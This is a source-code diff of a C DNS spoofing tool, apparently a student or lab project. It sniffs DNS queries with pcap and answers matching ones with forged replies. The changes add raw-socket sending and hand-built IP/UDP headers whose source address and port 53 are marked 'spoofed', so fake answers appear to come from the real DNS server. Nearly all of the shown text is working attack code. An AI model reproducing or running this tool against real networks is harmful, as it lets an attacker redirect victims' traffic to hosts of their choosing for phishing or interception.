@@ -32,7 +32,7 @@
 #define PCAP_INTERFACENAME_SIZE 16
 #define FILTER_SIZE 200
 #define ETHER_ADDR_LEN  6
-#define ANSWER_SIZE 1500
+#define DATAGRAM_SIZE 8192
 
 typedef struct _SpoofParams_ {
   char ip[IP_SIZE];                        /* ip address (xxx.xxx.xxx.xxx) */
@@ -47,7 +47,7 @@ struct etherhdr{
   u_short ether_type; /* network protocol */
 };
 
-/* DNS header structure */
+/* DNS header definition */
 struct dnshdr {
   char id[2];
   char flags[2];
@@ -111,19 +111,17 @@ void parse_args(int argc, char *argv[], SpoofParams *spoof_params){
 }
 
 /**
- * Extracts the src ip from a ip header
+ * Extracts an ip from a ip header
  */
-void extract_ip_from_iphdr(struct iphdr* ip, char* request_ip){
+void extract_ip_from_iphdr(u_int32_t raw_ip, char* ip){
   int i;
   int aux[4];
-  u_int32_t raw_ip;
   
-  raw_ip = ip->saddr;
   for(i=0;i<4;i++){
     aux[i] = (raw_ip >> (i*8)) & 0xff;
   }
   
-  sprintf(request_ip, "%d.%d.%d.%d",aux[0], aux[1], aux[2], aux[3]);
+  sprintf(ip, "%d.%d.%d.%d",aux[0], aux[1], aux[2], aux[3]);
 }
 
 /**
@@ -136,7 +134,7 @@ void extract_port_from_udphdr(struct udphdr* udp, u_int16_t* port){
 /**
  * Extracts DNS query and ip from packet
  */
-void extract_dns_data(const u_char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query, char* request_ip, u_int16_t *port){
+void extract_dns_data(const u_char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query, char* src_ip, char* dst_ip, u_int16_t *port){
   struct etherhdr *ether;
   struct iphdr *ip;
   struct udphdr *udp;
@@ -147,8 +145,9 @@ void extract_dns_data(const u_char *packet, struct dnshdr **dns_hdr, struct dnsq
 
   /* ip header */
   ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
-  extract_ip_from_iphdr(ip, request_ip);
-
+  extract_ip_from_iphdr(ip->saddr, src_ip);
+  extract_ip_from_iphdr(ip->daddr, dst_ip);
+  
   /* udp header */
   ip_header_size = ip->ihl*4;
   udp = (struct udphdr *)(((char*) ip) + ip_header_size);
@@ -191,22 +190,76 @@ void print_message(char* request, char* ip){
   printf("O host %s fez uma requisição a %s\n", ip, request);
 }
 
-void send_dns_answer(char* ip, u_int32_t port, char* packet, int packlen) {
-  int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+/**
+ * Sends a dns answer using raw sockets
+ */
+void send_dns_answer(char* ip, u_int16_t port, char* packet, int packlen) {
   struct sockaddr_in to_addr;
   int bytes_sent;
+  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  int one = 1;
+  const int *val = &one;
 
   if (sock < 0) {
-    printf("Erro ao criar o socket");
+    fprintf(stderr, "Error creating socket");
     return;
   }
   to_addr.sin_family = AF_INET;
   to_addr.sin_port = htons(port);
   to_addr.sin_addr.s_addr = inet_addr(ip);
   
+  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
+    fprintf(stderr, "Error at setsockopt()");
+    return;
+  }
+  
   bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
   if(bytes_sent < 0)
-    printf("Erro ao enviar os dados");
+    fprintf(stderr, "Error sending data");
+}
+
+/**
+ * Calculates a checksum for a given header
+ */
+unsigned short csum (unsigned short *buf, int nwords)
+{
+  unsigned long sum;
+  for (sum = 0; nwords > 0; nwords--)
+    sum += *buf++;
+  sum = (sum >> 16) + (sum & 0xffff);
+  sum += (sum >> 16);
+  return ~sum;
+}
+
+
+
+/**
+ * Builds an UDP/IP datagram
+ */
+void build_udp_ip_datagram(char* datagram, unsigned int payload_size, char* src_ip, char* dst_ip, u_int16_t port){
+  
+  struct ip *ip_hdr = (struct ip *) datagram;
+  struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof (struct ip));
+  
+  ip_hdr->ip_hl = 5; //header length
+  ip_hdr->ip_v = 4; //version
+  ip_hdr->ip_tos = 0; //tos
+  ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size;  //length
+  ip_hdr->ip_id = 0; //id
+  ip_hdr->ip_off = 0; //fragment offset
+  ip_hdr->ip_ttl = 255; //ttl
+  ip_hdr->ip_p = 17; //protocol
+  ip_hdr->ip_sum = 0; //temp checksum
+  ip_hdr->ip_src.s_addr = inet_addr (dst_ip); //src ip - spoofed
+  ip_hdr->ip_dst.s_addr = inet_addr(src_ip); //dst ip
+  
+  udp_hdr->source = htons(53); //src port - spoofed
+  udp_hdr->dest = htons(port); //dst port
+  udp_hdr->len = htons(sizeof(struct udphdr) + payload_size); //length
+  udp_hdr->check = 0; //checksum - disabled
+  
+  ip_hdr->ip_sum = csum ((unsigned short *) datagram, ip_hdr->ip_len >> 1); //real checksum
+  
 }
 
 /**
@@ -266,20 +319,25 @@ void handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char 
   struct dnshdr *dns_hdr;
 
   char request[REQUEST_SIZE];
-  char ip[IP_SIZE];
+  char src_ip[IP_SIZE], dst_ip[IP_SIZE];
   u_int16_t port;
 
-  char answer[ANSWER_SIZE];
-  unsigned int answer_size; 
+  char datagram[DATAGRAM_SIZE];
+  char* answer;
+  unsigned int datagram_size; 
   
+  memset(datagram, 0, DATAGRAM_SIZE);
   spoof_params = (SpoofParams*)args;
-  extract_dns_data(packet, &dns_hdr, &dns_query, ip, &port);
+  extract_dns_data(packet, &dns_hdr, &dns_query, src_ip, dst_ip, &port);
   extract_dns_request(&dns_query, request);
   
   if(!strcmp(request, spoof_params->request)){
-    answer_size = build_dns_answer(spoof_params, dns_hdr, answer, request);
-    send_dns_answer(ip, port, answer, answer_size);
-    print_message(request, ip);
+    answer = datagram + sizeof(struct ip) + sizeof(struct udphdr);
+    datagram_size = build_dns_answer(spoof_params, dns_hdr, answer, request);
+    build_udp_ip_datagram(datagram, datagram_size, src_ip, dst_ip, port);
+    datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
+    send_dns_answer(src_ip, port, datagram, datagram_size);
+    print_message(request, src_ip);
   }
 }
 
